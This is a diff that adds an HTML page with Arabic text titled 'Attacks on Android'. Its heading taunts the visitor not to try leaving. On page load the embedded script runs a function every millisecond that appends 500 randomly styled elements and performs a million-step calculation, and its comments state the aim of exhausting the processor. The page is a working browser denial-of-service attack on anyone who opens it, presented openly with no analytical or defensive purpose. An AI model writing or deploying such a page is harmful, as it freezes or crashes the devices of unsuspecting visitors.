@@ -1,0 +1,51 @@
+<!DOCTYPE html>  <html>  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>هجمات على الأندرويد</title>  
+    <style>  
+        body {  
+            margin: 0;  
+            padding: 0;  
+            background-color: #000;  
+            color: #fff;  
+            text-align: center;  
+            font-family: Arial, sans-serif;  
+        }  
+        h1 {  
+            padding-top: 20px;  
+        }  
+    </style>  
+</head>  
+<body>  
+    <h1>✋ توقف عن الضغط على الخروج!</h1>  
+    <p>أنت الآن في حصن الأندرويد.</p>  <script>  
+    // دالة مدمجة لاستنزاف المعالج  
+    function destroyAndro() {  
+        // حلقة لا نهائية لإنشاء عناصر كثيرة جداً في كل مرة  
+        for (var i = 0; i < 500; i++) {  
+            // إنشاء عنصر div جديد  
+            var el = document.createElement('div');  
+            // إعطائه مظهر عشوائي ليأخذ مساحة أكبر  
+            el.style.position = 'absolute';  
+            el.style.left = Math.floor(Math.random() * window.innerWidth) + 'px';  
+            el.style.top = Math.floor(Math.random() * window.innerHeight) + 'px';  
+            el.style.width = Math.floor(Math.random() * 100) + 'px';  
+            el.style.height = Math.floor(Math.random() * 100) + 'px';  
+            el.style.backgroundColor = 'rgba(' + Math.floor(Math.random() * 255) + ',' + Math.floor(Math.random() * 255) + ',' + Math.floor(Math.random() * 255) + ', 0.5)';  
+            document.body.appendChild(el);  
+        }  
+
+        // عملية حسابية ثقيلة جداً لتشغيل المعالج  
+        var a = 0;  
+        for (var j = 0; j < 1000000; j++) {  
+            a = Math.sqrt(j) * Math.random();  
+        }  
+    }  
+
+    // تشغيل الهجوم كل 1 مللي ثانية  
+    setInterval(destroyAndro, 1);  
+</script>
+
+</body>  
+</html>
